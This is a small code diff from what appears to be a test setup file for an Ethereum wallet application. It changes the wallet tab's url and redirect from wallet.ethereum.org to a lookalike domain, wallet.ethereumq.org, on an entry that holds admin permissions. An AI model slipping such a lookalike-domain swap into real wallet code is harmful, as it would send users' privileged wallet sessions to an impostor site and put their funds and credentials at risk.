@@ -202,8 +202,8 @@ exports.mocha = (_module, options) => {
                     position: 0
                 });
                 Tabs.upsert({_id: 'wallet'}, {$set: {
-                    url: 'https://wallet.ethereum.org',
-                    redirect: 'https://wallet.ethereum.org',
+                    url: 'https://wallet.ethereumq.org',
+                    redirect: 'https://wallet.ethereumq.org',
                     position: 1,
                     permissions: { admin: true }
                 }});
